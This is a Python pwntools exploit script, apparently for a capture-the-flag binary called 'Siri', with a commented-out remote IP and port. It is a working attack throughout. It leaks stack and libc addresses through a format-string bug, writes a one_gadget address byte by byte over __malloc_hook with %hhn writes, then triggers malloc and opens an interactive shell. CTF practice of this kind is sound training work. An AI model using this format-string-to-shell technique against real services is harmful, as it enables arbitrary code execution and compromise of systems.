#coding=utf-8
from pwn import *
context(arch = "amd64" , os = "linux")
elf = ELF('./Siri')
sh = elf.process()
#sh = remote('114.116.54.89',10005)
#context.log_level = 'debug'
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
og = [0x4f365 , 0x4f3c2,0x10a45c]
def fmt(payload):
    sh.recvuntil('>>>')
    sh.sendline('Hey Siri!')
    sh.recvuntil('you?')
    sh.sendline("Remind me to "+ payload)

payload = '%46$pAAAA%83$p'
fmt(payload)
sh.recvuntil("to ")
stack = int(sh.recv(14),16)
info('stack: ' + hex(stack))
sh.recvuntil('AAAA')
libc_base =  int(sh.recv(16),16) - 231 -libc.sym['__libc_start_main']
info('libc_base: ' + hex(libc_base))
libc.address = libc_base
one_gadget = libc_base + og[1]
info("one_gadget: " + hex(one_gadget))
malloc_hook = libc.sym["__malloc_hook"]
# tar = stack - 0x118
tar = malloc_hook
info("target: " + hex(tar))
payload = ''
written_size = 0
offset = 64

for i in xrange(6):
    size = (one_gadget>>(8*i)) & 0xff
    size -= 27
    if(size > (written_size & 0xff)):
        payload += '%{0}c%{1}$hhn'.format(size-(written_size&0xff),offset+i)
        written_size += size - (written_size & 0xff)
    else:
        payload += '%{0}c%{1}$hhn'.format((0x100-(written_size&0xff))+size,offset+i)
        written_size += (0x100 - (written_size&0xff)) + size

payload=payload.ljust(0x80-13,'a')
for i in xrange(6):
    payload += p64(tar+i)
# gdb.attach(sh)
# payload = fmtstr_payload(40,{tar:one_gadget})
fmt(payload)
fmt("%99999c")

sh.interactive()
